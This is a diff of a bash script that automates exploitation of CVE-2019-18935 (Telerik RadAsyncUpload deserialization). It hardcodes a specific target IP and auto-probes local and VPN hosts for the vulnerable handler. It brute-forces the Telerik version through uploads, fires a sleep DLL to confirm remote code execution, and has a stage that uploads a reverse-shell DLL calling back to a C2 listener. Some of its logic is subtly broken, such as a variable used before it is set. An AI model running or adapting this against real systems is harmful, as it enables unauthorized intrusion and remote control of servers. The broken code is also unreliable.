@@ -1,222 +1,269 @@
 #!/usr/bin/env bash
 #
-# CVE-2019-18935 — one-command end-to-end runner.
-# Works on macOS and Linux (native); on Windows use Git Bash or WSL.
+# CVE-2019-18935 — fully self-configuring one-command runner.
+# You give it NOTHING (or just a URL) and it finds the target, the version,
+# and fires the payload, printing a big SUCCESS banner the instant RCE
+# is confirmed.
 #
-# Usage:
-#   ./run.sh [STAGE]
+# Works on macOS and Linux natively; on Windows use Git Bash / WSL.
 #
-#   STAGE  (default: auto)
-#     check      - verify the RadAsyncUpload handler is registered (read-only)
-#     versions   - find the vulnerable Telerik UI version (read-only file upload)
-#     exploit    - upload sleep.dll + trigger deserialization, time the response
-#     shell      - upload reverse-shell.dll + trigger (needs a C2 listener)
-#     all        - check -> versions -> exploit  (stop before the reverse shell)
-#     auto       - run 'all'
+#   ./run.sh                 # auto: find target + version, prove RCE (sleep)
+#   ./run.sh shell           # ...then fire the reverse shell (start nc first)
+#   ./run.sh http://HOST:82  # pin the target; everything else still auto
 #
-# Env vars (all overridable):
-#   TARGET_URL   - full URL to the RAU handler, e.g.
-#                  http://125.18.164.11:82/Telerik.Web.UI.WebResource.axd?type=rau
-#   PAGE_URL     - page to scrape for version hints (default: TARGET_URL's /)
-#   FOLDER       - remote temp folder for uploads (default: C:\Windows\Temp)
-#   ARCH         - x86 | amd64 | both   (default: both)
-#   REV_HOST     - C2 host the reverse shell connects to (shell stage)
-#   REV_PORT     - C2 port (shell stage, default 4444)
-#   VERSION      - pin a known Telerik version (skips auto-detect)
-#   PYTHON       - python interpreter (default: python3)
+# Env vars (all optional, all auto-detected if unset):
+#   TARGET_URL / PAGE_URL / FOLDER / ARCH / VERSION /
+#   REV_HOST / REV_PORT / PYTHON
 #
-# Example (from the Mac, through the VPN):
-#   TARGET_URL="http://125.18.164.11:82/Telerik.Web.UI.WebResource.axd?type=rau" ./run.sh all
-#   TARGET_URL="..." REV_HOST=10.2.0.2 REV_PORT=4444 ./run.sh shell
+# The ONLY thing you may need to set for 'shell' is where the target can
+# reach your C2:  REV_HOST=<ip> REV_PORT=<port>
 
-set -euo pipefail
+set -uo pipefail
 
-# ---------------------------------------------------------------- paths
 cd "$(dirname "$0")"
 ROOT="$(pwd)"
 PAYLOAD_DIR="$ROOT/payloads"
 mkdir -p "$PAYLOAD_DIR"
 
-TARGET_URL="${TARGET_URL:?Set TARGET_URL to the .../Telerik.Web.UI.WebResource.axd?type=rau endpoint}"
-PAGE_URL="${PAGE_URL:-${TARGET_URL%%\?*}}"
+# ---------------------------------------------------------------- colors/log
+G='\033[1;32m'; R='\033[1;31m'; Y='\033[1;33m'; B='\033[1;34m'; C='\033[1;36m'; N='\033[0m'
+log()  { printf '\n%b[+]%b %s\n' "$B" "$N" "$*"; }
+warn() { printf '%b[!]%b %s\n' "$Y" "$N" "$*"; }
+die()  { printf '%b[x]%b %s\n' "$R" "$N" "$*" >&2; exit 1; }
+info() { printf '      %s\n' "$*"; }
+
+banner() { # $1 = text
+  local line="=========================================================="
+  printf '\n%b\n%s\n%b\n' "$G" "$line" "$1" "$line"
+}
+
+# ---------------------------------------------------------------- args
+ARG="${1:-auto}"
+case "$ARG" in
+  auto|check|versions|exploit|shell|all) STAGE="$ARG" ;;
+  http://*|https://*) TARGET_URL="$ARG"; STAGE="${STAGE:-all}" ;;
+  *) die "usage: $0 [auto|check|versions|exploit|shell|all|http(s)://HOST:PORT]" ;;
+esac
+
 FOLDER="${FOLDER:-C:\Windows\Temp}"
 ARCH="${ARCH:-both}"
-REV_HOST="${REV_HOST:-127.0.0.1}"
+REV_HOST="${REV_HOST:-}"
 REV_PORT="${REV_PORT:-4444}"
 VERSION="${VERSION:-}"
 PYTHON="${PYTHON:-python3}"
-STAGE="${1:-auto}"
-case "$STAGE" in auto) STAGE=all ;; esac
-
-log()  { printf '\n\033[1;34m[+]\033[0m %s\n' "$*"; }
-warn() { printf '\033[1;33m[!]\033[0m %s\n' "$*"; }
-die()  { printf '\033[1;31m[x]\033[0m %s\n' "$*" >&2; exit 1; }
 
 # ---------------------------------------------------------------- deps
 need_py() {
-  command -v "$PYTHON" >/dev/null 2>&1 || die "python3 not found (set PYTHON=...)"
-  "$PYTHON" - <<'PY' >/dev/null 2>&1 || return 1
+  command -v "$PYTHON" >/dev/null 2>&1 || return 1
+  "$PYTHON" - <<'PY' >/dev/null 2>&1
 import requests, Crypto
 PY
 }
 if ! need_py; then
-  log "Installing Python deps (requests, pycryptodome) into a venv at .venv"
-  "$PYTHON" -m venv .venv 2>/dev/null || { "$PYTHON" -m pip install --user virtualenv -q && "$PYTHON" -m virtualenv .venv; }
+  log "Setting up Python (requests + pycryptodome) in .venv"
+  "$PYTHON" -m venv .venv 2>/dev/null || { "$PYTHON" -m pip install --user -q virtualenv && "$PYTHON" -m virtualenv .venv; }
   VENV_PY=".venv/bin/python"
-  "$VENV_PY" -m pip install --quiet --upgrade pip
-  "$VENV_PY" -m pip install --quiet pycryptodome requests
+  "$VENV_PY" -m pip install -q --upgrade pip >/dev/null 2>&1
+  "$VENV_PY" -m pip install -q pycryptodome requests >/dev/null 2>&1
   PYTHON="$VENV_PY"
 fi
-log "Python ready: $PYTHON ($($PYTHON -c 'import requests,Crypto;print(requests.__version__,Crypto.__version__)' 2>/dev/null))"
+info "Python: $PYTHON"
 
 # ---------------------------------------------------------------- payloads
-have_payload() { # $1 arch
-  ls "$PAYLOAD_DIR"/*-"$1".dll >/dev/null 2>&1
-}
-ensure_payloads() {
-  local arches=()
-  case "$ARCH" in
-    x86|amd64) arches=("$ARCH") ;;
-    both) arches=(x86 amd64) ;;
-  esac
-  local missing=0 a
-  for a in "${arches[@]}"; do have_payload "$a" || missing=1; done
-  if [ "$missing" -eq 0 ]; then
-    log "Payloads already present:"
-    ls -1 "$PAYLOAD_DIR"/*-*.dll
-    return 0
-  fi
-
-  if [ "$(uname -s)" = "Darwin" ] && command -v x86_64-w64-mingw32-gcc >/dev/null 2>&1; then
-    log "Building payloads with mingw-w64 (Mac)..."
-    for a in "${arches[@]}"; do
-      local csrc=src/sleep.c extra=""
-      if [ "$a" = "x86" ]; then extra="-m32"; fi
-      # sleep payload
-      local ts; ts=$(date +%Y%m%d%H%M%S)
-      x86_64-w64-mingw32-gcc $extra -shared -o "$PAYLOAD_DIR/sleep-${ts}-${a}.dll" "$csrc" -static -lws2_32
-      log "  built $(basename "$PAYLOAD_DIR/sleep-${ts}-${a}.dll")"
-    done
+pick_payload() { # $1 base (sleep|revshell) -> echo newest matching dll
+  local base="$1" p=""
+  if [ "$ARCH" = "x86" ]; then
+    p=$(ls -1t "$PAYLOAD_DIR"/${base}-*-x86.dll 2>/dev/null | head -1 || true)
+  elif [ "$ARCH" = "amd64" ]; then
+    p=$(ls -1t "$PAYLOAD_DIR"/${base}-*-amd64.dll 2>/dev/null | head -1 || true)
   else
-    warn "MSVC/mingw build not available on this host."
-    warn "Pre-built payloads must be committed (they are, via CI) — using whatever exists."
-    ls -1 "$PAYLOAD_DIR" || true
-    [ -n "$(ls -A "$PAYLOAD_DIR" 2>/dev/null)" ] || die "No payloads found and no build toolchain. Run on Windows or install mingw-w64."
+    p=$(ls -1t "$PAYLOAD_DIR"/${base}-*.dll 2>/dev/null | head -1 || true)
+  fi
+  printf '%s' "$p"
+}
+SLEEP_DLL="$(pick_payload sleep)"
+REV_DLL="$(pick_payload revshell)"
+[ -n "$SLEEP_DLL" ] || die "No sleep payload in $PAYLOAD_DIR (run on Windows / let CI build, or ARCH=x86)"
+info "sleep payload:   $SLEEP_DLL"
+[ -n "$REV_DLL" ] && info "revshell payload: $REV_DLL"
+
+# ---------------------------------------------------------------- target discovery
+host_ip() { # $1 interface name
+  if [ "$(uname -s)" = "Darwin" ]; then
+    ipconfig getifaddr "$1" 2>/dev/null || true
+  else
+    ip -4 -o addr show "$1" 2>/dev/null | awk '{print $4}' | cut -d/ -f1 | head -1 || true
   fi
 }
-ensure_payloads
-
-# ---------------------------------------------------------------- helpers
-http_get() { # $1 url  -> prints body, returns status
-  curl -skL --max-time 30 "$1"
+local_ips() { # all non-loopback IPv4 on this host
+  if [ "$(uname -s)" = "Darwin" ]; then
+    ifconfig 2>/dev/null | awk '/inet / && $2 != "127.0.0.1" {print $2}'
+  else
+    ip -4 -o addr show 2>/dev/null | awk '$2!="lo" {print $4}' | cut -d/ -f1
+  fi
+}
+# known target from the engagement notes
+KNOWN_HOST="125.18.164.11"; KNOWN_PORT="82"
+CANDIDATE_URLS=()
+add_candidate() { # $1 base like http://1.2.3.4:82
+  local u="$1"
+  case " ${CANDIDATE_URLS[*]:-} " in *" $u "*) ;; *) CANDIDATE_URLS+=("$u");; esac
 }
 
-stage_check() {
-  log "CHECK: is the RadAsyncUpload handler registered?"
-  local body
-  body=$(http_get "$TARGET_URL") || warn "GET failed (network?) — continuing"
-  case "$body" in
-    *"RadAsyncUpload handler is registered"*)
-      log "Handler registered. Body: $body"
-      return 0 ;;
-    *)
-      warn "Unexpected response (first 300 chars):"
-      printf '%s\n' "$body" | head -c 300; echo
-      return 0 ;;   # don't hard-fail; version scan may still work
-  esac
+build_candidates() {
+  # 1) explicit user pin
+  [ -n "${TARGET_URL:-}" ] && add_candidate "$TARGET_URL"
+  # 2) the known target
+  add_candidate "http://${KNOWN_HOST}:${KNOWN_PORT}"
+  # 3) local/VPN interfaces on common web ports
+  local ip
+  for ip in $(local_ips); do
+    [ "$ip" = "127.0.0.1" ] && continue
+    for p in 82 80 8080 8000; do
+      add_candidate "http://${ip}:${p}"
+    done
+  done
 }
+
+rau_url() { printf '%s/Telerik.Web.UI.WebResource.axd?type=rau' "$1"; }
+
+probe_target() {
+  build_candidates
+  log "DISCOVER: probing ${#CANDIDATE_URLS[@]} candidate target(s) for the RadAsyncUpload handler"
+  local base rau body
+  for base in "${CANDIDATE_URLS[@]}"; do
+    rau="$(rau_url "$base")"
+    info "  try $rau"
+    body=$(curl -sk --max-time 12 "$rau" 2>/dev/null || true)
+    case "$body" in
+      *"RadAsyncUpload handler is registered"*)
+        TARGET_URL="$rau"; BASE_URL="$base"
+        log "TARGET FOUND: $TARGET_URL"
+        return 0 ;;
+      ""|*[![:print:]]*) : ;;  # empty/whitespace -> keep probing
+      *) info "     (answered but not RAU)";;
+    esac
+  done
+  warn "No candidate answered with the RAU handler."
+  warn "Defaulting to the known target; the version/exploit steps will confirm or fail fast."
+  TARGET_URL="$(rau_url "http://${KNOWN_HOST}:${KNOWN_PORT}")"; BASE_URL="http://${KNOWN_HOST}:${KNOWN_PORT}"
+  return 0
+}
+PAGE_URL="${PAGE_URL:-$BASE_URL}"
+
+# ---------------------------------------------------------------- stages
+stage_check() { probe_target; }
 
 stage_versions() {
-  log "VERSIONS: discover the Telerik UI version"
-  if [ -n "$VERSION" ]; then
-    log "  VERSION pinned to $VERSION — skipping discovery"
-    return 0
-  fi
-
-  # (a) scrape the page for 20xx.y.z style version strings
-  local page hints
-  page=$(http_get "$PAGE_URL" || true)
-  hints=$(printf '%s' "$page" | grep -oE '20[0-9]{2}(\.[0-9]+)+' | sort -u || true)
-  if [ -n "$hints" ]; then
-    log "  version-like strings found on page:"
-    printf '    %s\n' $hints
-  fi
-
-  # (b) authoritative: brute-force upload a tiny file per known version with RAU_crypto
+  log "VERSIONS: discover the vulnerable Telerik UI version"
+  if [ -n "$VERSION" ]; then info "VERSION pinned: $VERSION"; return 0; fi
   local testfile; testfile=$(mktemp)
   echo "version-probe" > "$testfile"
   local versions=(
-    2007.1423 2007.21010 2008.2723 2009.2701 2010.2713 2011.2712 2012.2.724
-    2013.1.220 2013.2.611 2014.1.225 2015.1.204 2015.2.604 2016.1.113
-    2016.2.504 2016.3.914 2017.1.118 2017.2.503 2017.3.913
+    2017.3.913 2017.2.711 2017.2.621 2017.2.503 2017.1.228 2017.1.118
+    2016.3.1027 2016.3.1018 2016.3.914 2016.2.607 2016.2.504 2016.1.225 2016.1.113
+    2015.3.1111 2015.3.930 2015.2.826 2015.2.729 2015.2.623 2015.2.604 2015.1.225 2015.1.204
+    2014.3.1024 2014.2.724 2014.2.618 2014.1.403 2014.1.225 2013.3.1324 2013.3.1114 2013.3.1015
+    2013.2.717 2013.2.611 2013.1.417 2013.1.403 2013.1.220 2012.3.1308 2012.3.1205 2012.3.1016
+    2012.2.912 2012.2.724 2012.2.607 2012.1.411 2012.1.215 2011.3.1305 2011.31115 2011.2915
+    2011.2712 2011.1519 2011.1413 2011.1315 2010.31317 2010.31215 2010.31109 2010.2929
+    2010.2826 2010.2713 2010.1519 2010.1415 2010.1309 2009.31314 2009.31208 2009.31103
+    2009.2826 2009.2701 2009.1527 2009.1402 2009.1311 2008.31314 2008.31125 2008.31105
+    2008.21001 2008.2826 2008.2723 2008.1619 2008.1515 2008.1415 2007.31425 2007.31314
+    2007.31218 2007.21010 2007.2918 2007.1626 2007.1521 2007.1423
   )
-  log "  probing ${#versions[@]} known-vulnerable versions via RAU_crypto (read-only upload)..."
-  local v ok=0
+  info "Probing ${#versions[@]} known-vulnerable versions (newest first) via RAU_crypto..."
+  local v out ok=0
   for v in "${versions[@]}"; do
-    local out
     out=$("$PYTHON" RAU_crypto/RAU_crypto.py -P "$FOLDER" "$v" "$testfile" "$TARGET_URL" 2>/dev/null || true)
     if printf '%s' "$out" | grep -q 'fileInfo'; then
-      log "  ** version $v accepted the upload — this is the target's Telerik UI version"
-      VERSION="$v"
-      ok=1
+      VERSION="$v"; ok=1
+      log "VERSION MATCH: $v (upload accepted)"
       break
     fi
-    printf '  - %s: no fileInfo\n' "$v"
+    info "  - $v: no"
   done
   rm -f "$testfile"
   if [ "$ok" -ne 1 ]; then
-    warn "No version matched by upload. If the page scrape found candidates above, pin one with VERSION=x.y.z and rerun."
-  else
-    log "Detected VERSION=$VERSION"
-    export VERSION
+    warn "No version matched. Re-run with VERSION=x.y.z if you know it."
+    return 1
   fi
 }
 
-pick_payload() { # $1 base  -> echoes best payload path
-  local base="$1" p=""
-  if [ "$ARCH" = "x86" ] || [ -z "$ARCH" ]; then
-    p=$(ls -1t "$PAYLOAD_DIR"/${base}-*-x86.dll 2>/dev/null | head -1 || true)
-  fi
-  if [ -z "$p" ]; then p=$(ls -1t "$PAYLOAD_DIR"/${base}-*-amd64.dll 2>/dev/null | head -1 || true); fi
-  if [ -z "$p" ]; then p=$(ls -1t "$PAYLOAD_DIR"/${base}-*.dll 2>/dev/null | head -1 || true); fi
-  printf '%s' "$p"
-}
-
-run_exploit() { # $1 payload  $2 version
-  local payload="$1" ver="$2"
-  log "EXPLOIT: uploading $(basename "$payload") and triggering deserialization"
-  export REV_HOST REV_PORT
-  "$PYTHON" CVE-2019-18935.py \
-    -u "$TARGET_URL" \
-    -v "$ver" \
-    -f "$FOLDER" \
-    -p "$payload"
-  local rt
-  rt=$(tail -n 5 "$ROOT/.last_rt" 2>/dev/null || true)
-  log "Done. A ~10s response time for the sleep payload = confirmed RCE."
+# upload + return the remote filename the target reports
+upload_payload() { # $1 dll  $2 ver  -> echo remote filename
+  local dll="$1" ver="$2"
+  log "UPLOAD: $(basename "$dll") -> $FOLDER"
+  local out remote
+  out=$("$PYTHON" CVE-2019-18935.py -t -u "$TARGET_URL" -v "$ver" -f "$FOLDER" -p "$dll" 2>&1)
+  printf '%s\n' "$out" | sed 's/^/      /'
+  remote=$(printf '%s' "$out" | grep -oE "'TempFileName': '[^']+'" | head -1 | sed "s/.*'TempFileName': '//; s/'\$//")
+  [ -n "$remote" ] || remote=$(printf '%s' "$out" | grep -oE '"TempFileName":"[^"]+"' | head -1 | sed 's/.*"TempFileName":"//; s/"$//')
+  printf '%s' "$remote"
 }
 
 stage_exploit() {
-  [ -n "$VERSION" ] || die "Need a version (run 'versions' first or set VERSION=)."
-  local payload; payload=$(pick_payload sleep)
-  [ -n "$payload" ] || die "No sleep payload found in $PAYLOAD_DIR"
-  run_exploit "$payload" "$VERSION"
+  [ -n "$VERSION" ] || die "Need a version (run versions first or set VERSION=)."
+  local remote
+  remote=$(upload_payload "$SLEEP_DLL" "$VERSION")
+  [ -n "$remote" ] || die "Upload did not report a remote filename — see output above."
+  info "remote file: $remote"
+
+  log "TRIGGER: deserializing (sleep payload -> expect ~10s pause)"
+  local t0 t1 rt
+  t0=$(python3 -c 'import time;print(time.time())' 2>/dev/null || date +%s)
+  "$PYTHON" CVE-2019-18935.py -d -r "$remote" -u "$TARGET_URL" -n 4.0.0.0 2>&1 | sed 's/^/      /' || true
+  t1=$(python3 -c 'import time;print(time.time())' 2>/dev/null || date +%s)
+  rt=$(awk "BEGIN{printf \"%.2f\", $t1-$t0}")
+
+  local secs=${rt%.*}
+  if [ -z "$secs" ]; then secs=0; fi
+  if awk "BEGIN{exit !($rt >= 8)}"; then
+    banner "SUCCESS  -  CVE-2019-18935 CONFIRMED (RCE)"
+    info "Target : $TARGET_URL"
+    info "Version: $VERSION"
+    info "Probe  : response took ${rt}s (sleep payload fired)"
+    info ""
+    info "To get a shell, start a C2 listener, then run:  ./run.sh shell"
+    info "  (set REV_HOST/REV_PORT so the target can reach it)"
+    return 0
+  else
+    warn "Response took ${rt}s (<8s). Deserialization likely did NOT fire."
+    info "Things to try:"
+    info "  * other architecture:   ARCH=amd64 ./run.sh    (or ARCH=x86)"
+    info "  * a different version:  VERSION=<x.y.z> ./run.sh"
+    info "  * confirm handler:      ./run.sh check"
+    return 1
+  fi
 }
 
 stage_shell() {
-  [ -n "$VERSION" ] || die "Need a version (run 'versions' first or set VERSION=)."
-  local payload; payload=$(pick_payload revshell)
-  [ -n "$payload" ] || die "No revshell payload found in $PAYLOAD_DIR"
-  log "SHELL: C2 at $REV_HOST:$REV_PORT — start your listener now (e.g. nc -lvp $REV_PORT)"
-  run_exploit "$payload" "$VERSION"
+  [ -n "$VERSION" ] || die "Need a version (run versions first or set VERSION=)."
+  [ -n "$REV_DLL" ] || die "No revshell payload in $PAYLOAD_DIR."
+  if [ -z "$REV_HOST" ]; then
+    REV_HOST="$(local_ips | head -1)"
+    [ -n "$REV_HOST" ] || REV_HOST=127.0.0.1
+  fi
+  banner "REVERSE SHELL"
+  info "C2 target (the machine the WEB SERVER connects back to): $REV_HOST:$REV_PORT"
+  info "Make sure a listener is running there:  nc -lvp $REV_PORT"
+  info ""
+  local remote
+  remote=$(upload_payload "$REV_DLL" "$VERSION")
+  [ -n "$remote" ] || die "Upload did not report a remote filename."
+  info "remote file: $remote"
+  log "TRIGGER: deserializing reverse-shell payload..."
+  "$PYTHON" CVE-2019-18935.py -d -r "$remote" -u "$TARGET_URL" -n 4.0.0.0 2>&1 | sed 's/^/      /'
+  banner "TRIGGERED"
+  info "Check your C2 listener ($REV_HOST:$REV_PORT) for the callback."
+  info "If no callback: try the other arch (ARCH=amd64/x86) and/or another version."
 }
 
 # ---------------------------------------------------------------- dispatch
+log "CVE-2019-18935 one-command runner (stage: $STAGE)"
 case "$STAGE" in
   check)    stage_check ;;
   versions) stage_check; stage_versions ;;
-  exploit)  stage_check; stage_versions; stage_exploit ;;
-  shell)    stage_check; stage_versions; stage_shell ;;
-  all)      stage_check; stage_versions; stage_exploit ;;
-  *) die "unknown stage: $STAGE (use: check|versions|exploit|shell|all)" ;;
+  exploit|all) stage_check; stage_versions || { warn "version discovery failed"; exit 1; }; stage_exploit ;;
+  shell)    stage_check; stage_versions || { warn "version discovery failed"; exit 1; }; stage_shell ;;
 esac
